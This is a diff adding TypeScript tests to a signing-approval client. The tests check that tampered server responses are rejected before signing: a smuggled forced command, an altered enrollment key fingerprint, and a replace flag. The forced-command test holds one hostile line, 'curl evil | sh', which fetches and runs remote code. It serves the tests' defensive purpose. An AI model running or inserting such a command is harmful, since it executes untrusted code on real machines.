@@ -10,6 +10,7 @@ import {
   completeLogin,
   completeRegistration,
   explainError,
+  nothingChanged,
   prepareAction,
   prepareLogin,
   prepareRegistrationWithCode,
@@ -216,9 +217,52 @@ describe("a lying or buggy server is caught before anything is signed", () => {
     expect(e.message).toMatch(/challenge does not match/);
   });
 
+  test("a field the page can't show (e.g. a forced command)", async () => {
+    const e = await tampered((r) => rewrite(r, { force_command: "curl evil | sh" }));
+    expect(e.message).toMatch(/force_command/);
+  });
+
   test("non-canonical text (duplicate key)", async () => {
     const e = await tampered((r) => ({ ...r, canonical: r.canonical.replace('"action":"approve"', '"action":"deny","action":"approve"') }));
     expect(e.message).toMatch(/canonical form/);
+  });
+});
+
+describe("enrollment checks", () => {
+  test("the client key and the replace flag must match the card", async () => {
+    const m = startMock({ port: 0, distDir: null });
+    try {
+      const { api } = await signedIn(m);
+      const item = (await api.state()).pending!.find((p) => p.kind === "enrollment")!;
+      const sha = async (t: string) => encode(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(t))));
+      for (const change of [{ key_fingerprint: "SHA256:attacker" }, { replaces: true }]) {
+        const evil: Api = {
+          ...api,
+          challenge: async (o, id, b) => {
+            const r = await api.challenge(o, id, b);
+            const text = canonicalJSON({ ...JSON.parse(r.canonical), ...change });
+            const pk = (r.public_key as { publicKey: Record<string, unknown> }).publicKey;
+            return { ...r, canonical: text, public_key: { publicKey: { ...pk, challenge: await sha(text) } } };
+          },
+        };
+        const e = await prepareAction(evil, targetForPending(item), { action: "approve" }).catch((x) => x);
+        expect(e).toBeInstanceOf(FlowError);
+      }
+    } finally {
+      m.stop();
+    }
+  });
+});
+
+describe("error outcomes", () => {
+  test("only refusals before signing, cancelled prompts and 4xx count as 'nothing changed'", () => {
+    expect(nothingChanged(new FlowError("x"))).toBe(true);
+    expect(nothingChanged(new ApiError(409, "conflict", ""))).toBe(true);
+    expect(nothingChanged(Object.assign(new Error("x"), { name: "NotAllowedError" }))).toBe(true);
+    expect(nothingChanged(new ApiError(500, "internal", ""))).toBe(false);
+    expect(nothingChanged(new ApiError(524, "http_524", ""))).toBe(false);
+    expect(nothingChanged(new ApiError(0, "network", ""))).toBe(false);
+    expect(nothingChanged(new TypeError("Failed to fetch"))).toBe(false);
   });
 });
 
